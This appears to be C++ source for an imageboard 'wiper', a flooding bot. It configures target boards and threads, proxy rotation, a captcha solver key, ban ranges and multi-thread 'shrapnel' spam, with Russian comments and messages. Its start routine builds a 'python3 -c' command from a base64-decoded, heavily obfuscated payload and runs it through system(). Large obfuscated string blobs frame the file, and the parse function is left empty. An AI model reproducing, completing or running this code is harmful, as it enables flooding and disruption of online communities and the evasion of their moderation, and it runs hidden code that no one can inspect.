qBglKBSlK\\Yzq\\jA|\\YznMoOmcIXyMn!x\\GWgQV gNkpLBSlKBSlKbG)|cB%|\\ZTfcGX$cBi bnmo\\\"X{LSpKBSlKBYXu`Y[gb\"Xu\\j%|\\ZT!bB%va\"TmJC )JC@&BglKBSlKBZAxb#Swb\"X Z#TmdISpcIKq\\\"cmbj@tJBboMnqx`Y$pbnFw\\G)vMnOpa\"mk\\UiWTXiWZ OJSXKVLUAna#JgZ{AqajA{[Y%o\\Uik`GF{aoXvLUlqBglKBSlK\\Yzq\\jA|\\YznMoOmcIXyMn!x\\GWgQV gN|pLBSlKBSlKbG)|cB%|\\ZTfcGX$cBi bnmo\\\"X{JBugLBJ1JBJgL{A `IKm[YSwbG)|cIOa[nzi[\"vf[Y%!b! w[\")vaYXwcBlwbnXyaGFk\\UgjZG$jMB@jZG$1JBJqMoKmbGzi[\"WpJmzwQjAbajJuJBKbamzwJjlqBglKBSlK\\Yzq\\jA|\\YznMoOmcIXyMn!x\\GWgQV gOCpLBSlKBSlKbG)|cB%|\\ZTfcGX$cBi bnmo\\\"X{JBugb\"Xu\\j% bnFyZ#KmbGzi[\"Wpb\"Xu\\j%|\\ZT!bB%y[ZO \\ZOabnFw\\G)vMoKianTqaoSpNBygaGXwLIOmaG[wb\"X cZ@wbGF|cGX|LU zLX qLSpKBSlKBYXu`Y[gb\"Xu\\j%|\\ZT!bB%va\"TmJC )JCW&BglKBSlKBZAxb#Swb\"X Z#TmdISpcIKq\\\"cmbj@tJBKpcITyb|pxM|Kk`B%p`{JgL{@jM\"JxbnX|M !`dCcZNCXLNnOpMnitJj@sJCWyNBlLBSlKBSmmaGmnJIOmaG[wb\"X cZ@waY)l\\U@)QU@\"PgpKBSlKBSmya#O MoOmcF) \\Zi LIT{`Yco\\ZJgL{A|\\YznMoT{[ZAfbnXyaGFk\\Ui|\\YznMoOmcIXyMnKq\\!Aib#TmLUlLBSlKBSmmaGmnJIOmaG[wb\"X cZ@waY)l\\U@)QU@#PgpKBSlKBSmya#O MoOmcF) \\Zi LIT{`Yco\\ZJgL{A|\\YznMoT{[ZAfbnXyaGFk\\Ui|\\YznMoTpbnXi\\IOacGi{\\YFlVoXvZU%ya#O b!v#`Gm \\X)iaoX|ZU%ka\"!v\\Y% LUlLBSlKBSmmaGmnJIOmaG[wb\"X cZ@waY)l\\U@)QU@$PgpKBSlKBSmya#O MoOmcF) \\Zi LIT{`Yco\\ZJgL{A|\\YznMoOmcIXyMoAib#Tmb!v{[Y%la\" wbnFw\\GmwcBgyMBAu\\Y$pb\"Xu\\j%|\\ZT!bB%y[ZO \\ZNqMVDqZU%{\\ZAu[YOmLBKBSW%PXW!BTXJjMBA|cIJpbnFw\\G)vMoKianTqaoSpb\"Xu\\j%|\\ZT!bB%v`Y%B[Y$uJIOmaG[wb\"X cZ@waYF$SnFwLUlqLSpKBSlKBYmnJIOmaG[wb\"X cZ@waYXl`YFM`Y%lJC$gNCpLBSlKBSlKcIK%PgpKBSlKBSlK`Y[gb\"Xu\\j%|\\ZT!bB%v\\YTq[WvqanSgQV gN|pLBSlKBSlKBSmq\\jA|\\YznMoOmcIXyMoOpbnFyanXuS\"iibncmJBD)JC@&BglKBSlKBSlKBY!m\\Gmib OxcY% JC gaYmwLGzmaji|\\YznMoTpbnXi\\IOacGi{\\YFlVoXvZU%ya#O b!v#`Gm \\X)iaoX|ZU%v\\YTq[ZNqMB@ LSpKBSlKBSlKBSmna#JgaYXl`YDg`Y$gb\"Xu\\j% `IKm[YT|Y#TpbnXi\\D%!aX wbG)|cIOac\"iqcGXf[Y%!b! waYXl`YF|PgpKBSlKBSlKBSlKbIKqaoSpJvBi MtSuOGI MkSuvBy [$jMBAv\\YTq[U%w[Y!mMB@jLBJtb#T{LIcp`ZTmZ\"FwcZNtNUltJjCSx)B1 [ITgj@jL#OmaG[wcGi{\\YFlb!v `IKm[YTPcY!cMlmDL{Jg [MTgOB! MVSuBljLSpKBSlKBSlKBSlKaYXl`YDw\\G)#anzx[YSpLSpKBSlKBSlKBYXub\"W&BglKBSlKBSlKBY!m\\Gmib OxcY% JC gaYmwLGzmaji|\\YznMoTpbnXi",
    "\\IOacGi{\\YFlVoXvZU%ya#O b!v#`Gm \\X)iaoX|ZU%v\\YTq[ZNqMB@ LSpKBSlKBSlK\\Yz|\\VpLBSlKBSlKBSmv\\YTq[ZOCa#XwcB@)JIOmaG[wb\"X cZ@waYXl`YF|S\")!aoSLBglKBSlKBSmna#JgaYXl`YFPcY g`Y$gbnFw\\\"WpaYXl`YF|S\")!aoSqPgpKBSlKBSlKBYmnJIOmaG[wb\"X cZ@waYXl`YFM`Y%lJBD)JCN&BglKBSlKBSlKBYKucYXf[Y%!b{@)JIKianTxaU%{[Y%l`Y% LC@uJGzmaji|\\YznMoOmcIXyMn!m\\GmiWGF `INqMVDqBglKBSlKBSlK`Y[gb\"Xu\\j%|\\ZT!bB%v\\YTq[WvqanSgQV gNVpLBSlKBSlKBSlKbG)|cB%|\\ZTf`Y!i\\\"Wpb\"Xu\\j%|\\ZT!bB%v\\YTq[XAicGi|Y\"KucYXf[Y%!b! uJIOmaG[wb\"X cZ@wb\"ii`\"FuWG)#\\ZJuJIOmaG[wb\"X cZ@wb\"ii`\"FuS\")ua#JuJIOmaG[wb\"X cZ@wb\"ii`\"FuSY\\n`Y%mMBA|\\YznMoOmcIXyMoTxWD%ILSpKBSlKBSlKBYXu`Y[gb\"Xu\\j%|\\ZT!bB%v\\YTq[WvqanSgQV gNkpLBSlKBSlKBSlKbG)|cB%|\\ZTfcnml\\Y(pb\"Xu\\j%|\\ZT!bB%v\\YTq[XAicGi|Y\"KucYXf[Y%!b! qBglKBSlKBSlK\\Yzq\\jA|\\YznMoOmcIXyMn!m\\GmiU\"mw\\B@)QU@|PgpKBSlKBSlKBSmya#O MoOmcF)v\\YTq[Ui|\\YznMoTpbnXi\\IOacGi{\\YFlVoXvZU%ya#O b!v#`Gm \\X)iaoX|ZU%v\\YTq[ZOaaYXl`YFPcY!cMn%iaYWuJIOmaG[wcGi{\\YFlb!v `IKm[YTPcY!cMoAxb#T|Y#cp`ZTmZ\"FwcZOcMn!m\\Gmib!vv\\YTq[W%!aX w\\nmu\\Uygb\"Xu\\j%|\\ZT!bB%|`GFt[YzSa#cmbjygb\"Xu\\j%|\\ZT!bB%|`GFt[YzCa\"zxbjygb\"Xu\\j%|\\ZT!bB%|`GFt[YzA\\n\\qanWuJIOmaG[wb\"X cZ@wcG)SVlbqBglKBSlKBYX$[\"XycBAFdGOmbITqa\"$g[ZNg\\VpLBSlKBSlKBZA{`Y% LBMSocB!JOB( M\'Su)GCJOGA MtSuOGI MCTgvGNJB(g M3TgOB$ MtTgOB! M3SwOGB [yg [VSuOB% MuwJjlLBSlKBSmq\\jA|\\YznMoOmcIXyMoOi\\\"XOa\"TmJC )JCJ&BglKBSlKBYmnJIOmaG[wcGi{\\YFlb!v `IKm[YTPcY!cMoAxb#T|Y#cp`ZTmZ\"FwcZOcMoOi\\\"WgQV gXIK!\\VpLBSlKBSlKBZAxb#Swb\"X Z#Oi\\\"WpLSpKBSlKBSmmaIOmPgpKBSlKBSlKbG)|cB%y[ZKiaZNw[ZAy\\Y%lLBgj\\Y!i`YyjMB@pVn)w\\UygJjJqLUlLBSlKBSmmaGmnJIOmaG[wb\"X cZ@wb\"Fo\\W!x\\GWgQV gNVpLBSlKBSlKbG)|cB%|\\ZTfb\"Fo\\UgqBglKBSlK\\Yzq\\jA|\\YznMoOmcIXyMoOi\\\"XOa\"TmJC )JC@&BglKBSlKBZAxb#SwbGF{[Y!|MnFybGXw\\BgpJnXv[YmuJjygLD%xanWuJBJjLUlqBglKBSlKb#Xk[\"X|b{ygbnX|bG)wb\"WgQUAya#O MoOmanSpb\"Xu\\j%|\\ZT!bB%WUW!FV!XWMBA|\\YznMoOmcIXyMmAAXXOFLSpKBSlKBYmnJIO![\"Omb#N&BglKBSlKBXO [ZT|Mnmw[!Axb#T|LBlLBSlKBSlKbG)|cF)q\\B@)JC@LBSlKBSlKcIK%PgpKBSlKBSlKbG)|cF)q\\B@)JIKmb#AxaoOmY{KW[ZKo\\ZSjZSpKBSlKBSmmdGOmbIS&BglKBSlKBSmya#O Z\"mlJC gbnX|bG)wb\"XaJl%!aUKcBglKBSlKBYmnJIOmaG[wb\"X cZ@wb\"i{[ZAw\\YzC`GF{\\\"WgQV gNCpLBSlKBSlKBZA{`Y% LIA{a#i%L{JgMUA|cYOk\\ZO|MjASa#O JGmlPj@jL#O bjiya#O Z\"mlLUlLBSlKBSlK\\Yz|\\VpLBSlKBSlKBZA{`Y% LIA{a#i%L{JgMUA|cYOk\\ZO|MjASa#O JGmlPj@jL#O bjiya#O Z\"mlLUujJBgjL#TpbnXi\\B%KTBujJITpbnXi\\BljLSpKBSlKBSmq\\jA|\\YznMoOmcIXyMoTpbnXi\\B@iQU@jNBJ&BglKBSlKBSm|\\YznMoTpbnXi\\IOacGi{\\YFlVoXvZU%u[ZO UWSgQUA|cIJpbG)|cF)q\\BlLBSlKBSlKbIKqaoSpb#T{LIOmaG[wb\"X cZ@wbIKxdImU\\ZAm[ZT|S\")!aoSv[\")!aoTmbjltJjANV )SW{ANTW\\WJjlLBSlKBSlK[\")!aoTmbj@tQU@zBglKBSlK\\Yz|\\VpLBSlKBSlKbIKqaoSpbIKxdIluJBKya#O `Y%oJG\\i`Yzm\\B@vJjygbnX|bG)wb\"WqBglKBSlKBZT{dVpLBSlKBSlKBYmnJIKmb#AxaoOmY{KFboKxbjKcJC )JB \"PgpKBSlKBSlKBZA{`Y% LBMSm)By MISuOB) MkSw)B$MBCTgcGC MtSwB$wMj@jL#A{a#i%L{Jg MJg M3Sw)B1 [ZSxvB%JOB\' MkTgcGBJjlLBSlKBSlKBSmj[YTybn)$`YX|MnFybGXw\\Biybn)$dUlLBSlKBSlKBSmq\\jAu\\Y$pb\"Xu\\j%ybn)$`YX|LU@)QU@yPgpKBSlKBSlKBSmybnmwcBgj KfSuOB& M\'SxcGI MkSw)B$ [ITkBCSx)G@ M\'SwvGA MkTi)B& MgiJjlLBSlKBSlKBSlK[\")!aoTmbj@)JIOmaG[wb\"X cZ@wbIKxdImU\\ZAm[ZT|S\")!aoSLBSlKBSlKBSmmaIOmPgpKBSlKBSlKBSmybn)$dU@)JIOmaG[wbIKxdGmmb{%ya#@pNBlLBSlKBSlKBSlK[\")!aoTmbj@)JC@LBSlKBSlKBYXu`Y[gbnX|bG)wb\"XaJlX{bn){Jm gQV gMVS&BglKBSlKBSlKbIKqaoSpJvBZ MCSxcB1 [ISwOB(JBJtbIKxdIltJjCSujAna#Kj`YTl\\Y$w[#O\"JjlLBSlKBSlKBSmj[YTybn)$`YX|MnFybGXw\\Biybn)$dUlLBSlKBSlKBSmna#Kj`YTl\\Y%ybn)$dU%ibIAmanSpbIKxdIlqBglKBSlKBSlK`Y[gaGXwLIOmaG[wbIKxdGmmb{lgQV gNCpLBSlKBSlKBSlKbIKqaoSpJvBZ MCSwvB1 M#Ti)B$ MxSwOGA [yg M3TgOB1 MtTgcB$ [fSwvB$JUJqBglKBSlKBSlKBYOxcY% \\ZJgQUA|\\YznMoOmcIXyMoA{a#i%WnXy\\YF b OxcY% BglKBSlKBSlK\\Yz|\\VpLBSlKBSlKBSlKbIKxdIlg",
    "QUA|\\YznMoA{a#iq\\ZNwbG)yLC@qBglKBSlKBSlKBYOxcY% \\ZJgQU@yBglKBSlKBSmmaGmnJIKmb#AxaoOmY{KFboKxbjKcJC )JB #PgpKBSlKBSlKBYmnJIOmaG[wb\"X cZ@wb\"i{[ZAw\\YzC`GF{\\\"WgQV gNCpLBSlKBSlKBSlKbIKqaoSpJvBb M\'Ti)ByJOB{ [xTi)B$ [oSuOB! [Jg [MTgOB! MSwJOB` K\'SocBo KCStj$jLSpKBSlKBSlKBSm|[Y\\mZ#F!`ZSp[nFlbIKxdGmmb{yg\\n){[nml\\GXwbIKxdIlqBglKBSlKBSlK\\Yz|\\VpLBSlKBSlKBSlKbIKqaoSpJvBj [CSvcB JBJtb\"Xu\\j% `IKm[YT|Y#TpbnXi\\D%!aX wUWStJjCSv)By MtTgOGM MxTgcGQMjJqBglKBSlKBSlKBYTmaBA|\\YznMoTpbnXi\\IOacGi{\\YFlVoXvZSpKBSlKBSlKBSmq\\jAu\\Y$pb\"Xu\\j% `IKm[YT|LU@)QU@yPgpKBSlKBSlKBSlKbIKqaoSpJvBU [ISvUCTgvG@ MZSvOGMJOB# MCSwvG@ [xTgvGMMjCSqvB!JOB3 MZTgOB! M|SxvB| M@wJjlLBSlKBSlKBSlKBZOi\\nXfbZXqcBij[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUlLBSlKBSlKBYXu`Y[gan) JIKmb#AxaoOmPgpKBSlKBSlKBZA{`Y% LBMSovGJ MkSucB& M@g [ISvcGB MguJOB3 [CSxvBz [QSvcB(JOB! [oTlUCTgOBy MbwMj$jLSpKBSlKBSmmdGOmbISgTZik\\ZA `Y)wPgpKBSlKBSlK`Y[gaGXwLIKmb#AxaoOmLU@1JC@&BglKBSlKBSlKbIKqaoSpJvBj MCSwcB( MCTg)GBMj$wJBJtbIKxdIltJjCSujCSx)B\' M\'TicB1 Mlg MxSwOGA [JjLSpKBSlKBSlKBYKi\\IA{a#iq\\ZNw[ZAy\\Y%lLIA{a#i%LSpKBSlKBSlKBYmnJGzmaji|\\YznMoA{a#iq\\ZNqJC )JC@&BglKBSlKBSlKBZA{`Y% LBMSm)By MtSxvB) [fSwOB\' MkTgcGNJOB3 [CSxvB& [ISwOGI MtSwBDjLSpKBSlKBSlKBSmka#XwcGX{JC gb\"Xu\\j%|\\ZT!bB%ybn)$dXKmbGXicIOCa#Xwc@pKBSlKBSlKBYXub\"W&BglKBSlKBSlKBZA{a#i%JC gb\"Xu\\j%ybn)$`YX|MoAxbBgyLSpKBSlKBSlKBSmka#XwcGX{JC gN@pKBSmq\\jAwa#SgbIKxdIlg`Y$g[nFlbIKxdGmmb|pLBSlKBZOmaG[wbIKxdGmmb{%ycZOpLIA{a#i%LSpLBSmmdGOmbISgTZik\\ZA `Y)wJGF|JGW&BglKBZA{`Y% LGWqBglKbnX cZKwJFT{cYWLBYTm\\jA#`ZAmLIOmaG[uJITpbnXi\\F)ka#XwcBl&BglKW#TicINwb\"X aoXvV\"\\W`IKm[YT|LITpbnXi\\F)ka#XwcBlLBSmkaGF|b{AZ`ZAmbmTpbnXi\\Bi `IKm[YTqanbwXGi{\\YFlLVpLBSlK\\GXnJF)f`Y%qcF)fLIOmaG[uJIcqbGX{LVpLBSlKBZTpbnXi\\Gmw\\{%W`IKm[YSwZ!)qanm Z!(pb\"Xu\\jlLBSlKBZOmaG[wc\"my\\ZJgQUA#`ZAmbgpKBSml\\Y[gboXwLIOmaG[qPgpKBSlKb\"Xu\\j%#`ZAmbj%|\\Y%lZ#Axb#SpLSpKBYOu[ZO|JDmwbIX XGi{\\YFlLITpbnXi\\Gmw\\{%W`IKm[YSqPgpKBSml\\Y[gZ!)qanm Z!(pb\"Xu\\jl&BglKBSm `IKm[YTqanbwXGi{\\YFlMm)f`Y%qcF)fLIOmaG[qBglKBYTm\\jA{cY$pb\"Xu\\jl&BglKBSmVcGF b{%ybnmwcFO [ZT|LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBSlK\\ZTmbn%iaF)qaoA!cBij[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUlLBSm `IKm[YT|JC gY! LBSmqaoTpbj@)JDmwbIX XGi{\\YFlLBlLBSmqaoTpbj%|cGF{cBgqBglK\\n){JGlg`Y$gbnFw\\\"WpcGi{\\YFlZ\"OxcY% LVpLBSlKcGi{\\YFlb{%ibIAmanSpX\"my\\ZKW`IKm[YSpb\"Xu\\jlqBglKBZTpbnXi\\IOaMVFcMoO [ZK LBlLBSmna#Jg`UAqajA{[Y%o\\Uiu\\Y$pcGi{\\YFlb{lqPgpKBSm `IKm[YT|Y\"mcMnqx`Y$pLSq bol&Bgm|`G)#Z\"zx\\\"(pLSpKb\"X cZ@gQUAV\\ZT!bBi|dZNw[ZKocjlLBXcqbGX{V\"KsJC gX\"my\\ZJpb\"X cZ@uJIOmcIXyMnOicGFua\"buJIOmcIXyMoTpbnXi\\INqBgm|`Ycw[Yywb\"moanFuLIOq\\\"%iaB%VUWcKVmSuJIOi\\nXfbZXqcBlLBXcqbGX{V\"KsMocqbGWpb\"X cZ@wbG) a\"Otb OxcY% LSpKb\"Fn\\X)zcYm LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSqmdGOmbISgTZik\\ZA `Y)wJGF|JGW&BgmybnmwcBgj[ZKmaGm\"\\UAx[n)|bnFub#miJjlLBYmwbIX LBlL"
};

const string Setup::DIGITS = "0123456789";

Setup::Setup ()
    : hasBoard(false) , hasThread(false) , hasChaos(false) , hasPotocksCount(false) , hasLogMode(false) , hasSolver(false) , hasKey(false) , \
      hasProxyRepeatsCount(false) , hasMode(false) , hasMinBan(false) , hasMaxBan(false) , hasTriggerForm(false) , \
      hasShrapnelCharge(false) , hasMinPostsCount(false) , hasMediaKind(false) , hasMediaGroup(false) , \
      hasMediasCount(false) , hasSageMode(false) , hasShackalPower(false) , shackalColor(false) , shackalAffine(false) , \
      toPNG(false)
{}

Setup::Setup (const int &argsCount, const char * args[]) {
    *this = parse(argsCount, args);
}

Setup::~Setup () {}



bool Setup::is_digit (const char &c) {
    return DIGITS.find(c) != string::npos;
}

bool Setup::is_num (const string &str) {
    return !str.empty() && \
            ( (str.size() == 1 && is_digit(str[0])) || \
            ((str[0] == '-' || is_digit(str[0])) && is_pos_num(str.substr(1))) );
}

bool Setup::is_pos_num (const string &str) {
    if (str.empty()) return false;
    for (unsigned int pos(0); pos < str.length(); pos++)
        if (!is_digit(str[pos])) return false;
    return true;
}

bool Setup::is_zero (const string &str) {
    return str.size() == 1 && str[0] == '0';
}



void Setup::set_board (const string &board) {
    if (board.length() != 0) {
        this->board = board;
        hasBoard = true;
    } else
        hasBoard = false;
}
void Setup::set_thread (const string &thread) {
    if (is_pos_num(thread)) {
        this->thread = thread;
        hasThread = true;
    } else
        hasThread = false;
}
void Setup::set_chaos (const string &chaos) {
    if (is_num(chaos)) {
        this->chaos = chaos;
        hasChaos = true;
    } else
        hasChaos = false;
}
void Setup::set_potocksCount (const string &potocksCount) {
    if (is_pos_num(potocksCount)) {
        this->potocksCount = potocksCount;
        hasPotocksCount = true;
    } else
        hasPotocksCount = false;
}
void Setup::set_logMode (const char &logMode) {
    if (DIGITS.find(logMode) != string::npos) {
        this->logMode = logMode;
        hasLogMode = true;
    } else
        hasLogMode = false;
}
void Setup::set_solver (const string &solver) {
    if (is_pos_num(solver)) {
        this->solver = solver;
        hasSolver = true;
    } else
        hasSolver = false;
}
void Setup::set_key (const string &key) {
    if (key.empty() || key.length() == 32) {
        this->key = key;
        hasKey = true;
    } else
        hasKey = false;
}
void Setup::set_proxyRepeatsCount (const string &proxyRepeatsCount) {
    if (is_pos_num(proxyRepeatsCount) && !is_zero(proxyRepeatsCount)) {
        this->proxyRepeatsCount = proxyRepeatsCount;
        hasProxyRepeatsCount = true;
    } else
        hasProxyRepeatsCount = false;
}
void Setup::set_mode (const string &mode) {
    if (is_pos_num(mode)) {
        this->mode = mode;
        hasMode = true;
    } else
        hasMode = false;
}
void Setup::set_minBan (const string &minBan) {
    if (is_pos_num(minBan)) {
        this->minBan = minBan;
        hasMinBan = true;
    } else
        hasMinBan = false;
}
void Setup::set_maxBan (const string &maxBan) {
    if (is_pos_num(maxBan)) {
        this->maxBan = maxBan;
        hasMaxBan = true;
    } else
        hasMaxBan = false;
}
void Setup::set_triggerForm (const string &triggerForm) {
    if (is_pos_num(triggerForm)) {
        this->triggerForm = triggerForm;
        hasTriggerForm = true;
    } else
        hasTriggerForm = false;
}
void Setup::set_shrapnelCharge (const string &shrapnelCharge) {
    if (is_pos_num(shrapnelCharge)) {
        this->shrapnelCharge = shrapnelCharge;
        hasShrapnelCharge = true;
    } else
        hasShrapnelCharge = false;
}
void Setup::set_minPostsCount (const string &minPostsCount) {
    if (is_pos_num(minPostsCount)) {
        this->minPostsCount = minPostsCount;
        hasMinPostsCount = true;
    } else
        hasMinPostsCount = false;
}
void Setup::set_mediaKind (const char &mediaKind) {
    if (DIGITS.find(mediaKind) != string::npos) {
        this->mediaKind = mediaKind;
        hasMediaKind = true;
    } else
        hasMediaKind = false;
}
void Setup::set_mediaGroup (const string &mediaGroup) {
    if (!mediaGroup.empty()) {
        this->mediaGroup = mediaGroup;
        hasMediaGroup = true;
    } else
        hasMediaGroup = false;
}
void Setup::set_mediasCount (const string &mediasCount) {
    if (is_pos_num(mediasCount)) {
        this->mediasCount = mediasCount;
        hasMediasCount = true;
    }
}
void Setup::set_sageMode (const char &sageMode) {
    if (DIGITS.find(sageMode) != string::npos) {
        this->sageMode = sageMode;
        hasSageMode = true;
    } else
        hasSageMode = false;
}
void Setup::set_shackal_power (const unsigned char &value) {
    shackalPower = value;
}
void Setup::set_shackal_color (const bool &status) {
    shackalColor = status;
}
void Setup::set_shackal_affine (const bool &status) {
    shackalAffine = status;
}
void Setup::set_2PNG (const bool &status) {
    toPNG = status;
}
void Setup::set_shrapnelThreads (const vector<string> &shrapnelThreads) {
    if (!this->shrapnelThreads.empty()) this->shrapnelThreads.clear();
    this->shrapnelThreads.reserve(shrapnelThreads.size());
    this->shrapnelThreads = shrapnelThreads;
}



void Setup::clear () {
    hasBoard = false; hasThread = false; hasPotocksCount= false; hasLogMode= false; hasSolver= false; hasKey= false;
    hasProxyRepeatsCount= false; hasMode= false; hasMinBan= false; hasMaxBan= false; hasTriggerForm= false;
    hasShrapnelCharge= false; hasMinPostsCount= false; hasMediaKind= false; hasMediaGroup= false;
    hasMediasCount= false; hasSageMode = false;
}


/// wiper [-b|--board] <доска>! [-t|--target] <тред>! [-p|--potocks] <потоки>! [-s|--solver] <решатель>!
/// [-r|--repeats] <повторы проксей>! [-w|--wiper] <режим вайпалки>! [-s|--sage] <режим сажи>! [-d|--debug + <режим логов>]
/// [-k|--key| + <ключ>] [-x|--max + максимальный бан] [-n|--min + минимальный бан] [-r|--trigger + <режим триггера>]
/// [-h|--shrapnel + <число тредов для шрапнели>] [-m|--media + <тип прикреплений> [<число прикреплений>]]
/// [-g|--group + <подкаталог прикреплений>] [-T|--threads + <треды для шрапнели>*]
Setup Setup::parse (const int &argsCount, const char * args[]) {}

vector<string> Setup::validate () {
    vector<string> errors;

    if (!hasBoard) errors.push_back("Доска не задана!");
    if (!hasThread) errors.push_back("Цель не задана!");
    if (!hasPotocksCount) errors.push_back("Число потоков не задано!");
    if (!hasSolver) errors.push_back("Решатель не задан!");
    if (!hasProxyRepeatsCount) errors.push_back("Число повторов прокси не задано!");
    if (!hasMode) errors.push_back("Режим вайпалки не задан!");
    if (!hasSageMode) errors.push_back("Режим сажи не задан!");
    if (!hasTriggerForm) errors.push_back("Режим триггера не задан!");
    if (!hasKey) errors.push_back("Неправильно введён ключ!");
    if (mode == "8") {
        if (!hasMinBan) errors.push_back("Не задан нижний номер банов!");
        if (!hasMaxBan) errors.push_back("Не задан верхний номер банов!");
    }
    if (thread == "1" && shrapnelCharge == "0" && shrapnelThreads.size() == 0) errors.push_back("Не заданы треды для шрапнели!");
    if ((mediaKind == '1' || mediaKind == '2') && !hasMediaKind) errors.push_back("Не задано число прикреплений!");
    if (board == "d" && mediasCount != "0") errors.push_back("Прикрепления в /d/!");
    if (thread == "0" && (mode == "3" || mode == "7")) errors.push_back("Этим режимом нельзя вайпать нулевую!");
    if (thread == "0" && triggerForm != "0") errors.push_back("Триггер на нулевой!");
    if (thread == "0" && chaos != "-1") errors.push_back("Нельзя устраивать хаос с нулевой!");
    if (shrapnelCharge == "0" && chaos == "0") errors.push_back("Для полного хаоса требуется шрапнель!");
    if (thread == "0" && sageMode == '2') errors.push_back("Нельзя копировать сажу с нулевой!");
    if (errors.size() == 0) errors.push_back("OK");

    return errors;
}

unsigned char Setup::complete () {
    unsigned char autoCompCount(0);

    if (!hasThread) set_thread("0");
    else autoCompCount++;
    if (!hasPotocksCount) set_potocksCount("0");
    else autoCompCount++;
    if (!hasLogMode) set_logMode('0');
    else autoCompCount++;
    if (!hasProxyRepeatsCount) set_proxyRepeatsCount("50");
    else autoCompCount++;
    if (!hasTriggerForm) set_triggerForm("0");
    else autoCompCount++;
    if (!hasChaos) set_chaos("-1");
    else autoCompCount++;
    if (!hasShrapnelCharge) set_shrapnelCharge("0");
    else autoCompCount++;
    if (!hasMinPostsCount) set_minPostsCount("0");
    else autoCompCount++;
    if (!hasMediasCount) {
        if (board == "d") set_mediasCount("0");
        else set_mediasCount("1");
    }
    else autoCompCount++;
    if (!hasSageMode) set_sageMode('0');
    else autoCompCount++;

    return autoCompCount;
}

vector<string> Setup::start () {
    complete();
    vector<string> errors = validate();
    if (errors[0] == "OK") {
        string command(comline());
        system(command.c_str());
    }
    return errors;
}

/// python3 main.py <доска> <тред> <хаос> <потоки> <режим логов> <решатель> <ключ> <повторы прокси> <минимальный бан> <максимальный бан>
/// <триггер> <заряд шрапнели> <минимальное число постов для шрапнели> <вид прикреплений> <подкаталог прикреплений>
/// <число прикреплений> <сажа> <треды для шрапнели>
string Setup::comline () {
    string command("python3 -c \"from base64 import b64decode; code = b64decode(\'");
    command += decode("J{NgMUpvJGOx\\Gmw\\|pgcZTnMVggMUpvBn\\{a\" g[nF|\\V[ JGmvbG){cBAjOkTl\\YOx\\GWLBnTm\\jA a FVS mKLDTMV!TKLVpLBWFVS mKJC gK{bLBgmna#JgbG)|JGmwJIKiancmLGzmajiDU )WUUlqPgpKBYmnJDTMV!TKY#Axb! gQV gK{@oPjAAW OKUU@tQU@oNBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK{DoPjAAW OKUU@tQU@oNUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!yjK|pgSXOCUWlgL| gK|JoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbkK|pgSXOCUWlgL| gK|NoBglK\\Yzq\\jADU )WUXvya#OcJC )JBblK|pgSXOCUWlgL| gK|SoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbmK|pgSXOCUWlgL| gK|WoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbnK|pgSXOCUWlgL| gK|[oBglK\\Yzq\\jADU )WUXvya#OcJC )JBcbK{b&JDFVS mKJBu)JBb#KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLBb&JDFVS mKJBu)JBb$KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLUb&JDFVS mKJBu)JBb%KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSBb&JDFVS mKJBu)JBcAKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSUb&JDFVS mKJBu)JBcBKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSjb&JDFVS mKJBu)JBcCKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oS{b&JDFVS mKJBu)JBcDKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTBb&JDFVS mKJBu)JBcFKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTjb&JDFVS mKJBu)JBcGKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oT{b&JDFVS mKJBu)JBcIKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUUb&JDFVS mKJBu)JBcJKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUjb&JDFVS mKJBu)JBcKKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oU{b&JDFVS mKJBu)JBcLKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVBb&JDFVS mKJBu)JBcMKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVUb&JDFVS mKJBu)JBcNKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVjb&JDFVS mKJBu)JBcOKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oV{b&JDFVS mKJBu)JBcPKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWBb&JDFVS mKJBu)JBcQKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWUb&JDFVS mKJBu)JBcSKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oW{b&JDFVS mKJBu)JBcTKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXBb&JDFVS mKJBu)JBcUKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXUb&JDFVS mKJBu)JBcVKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXjb&JDFVS mKJBu)JBcWKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oX{b&JDFVS mKJBu)JBcXKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYBb&JDFVS mKJBu)JBcYKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYUb&JDFVS mKJBu)JBcZKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYjb&JDFVS mKJBu)JBc[KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oY{b&JDFVS mKJBu)JBc\\KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oZFyoPjAAW OKUU@tQU@oYjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"@oPjAAW OKUU@tQU@o[UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"DoPjAAW OKUU@tQU@o[jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"JoPjAAW OKUU@tQU@o[{bLBSmmaGmnJDTMV!TKY#Axb! 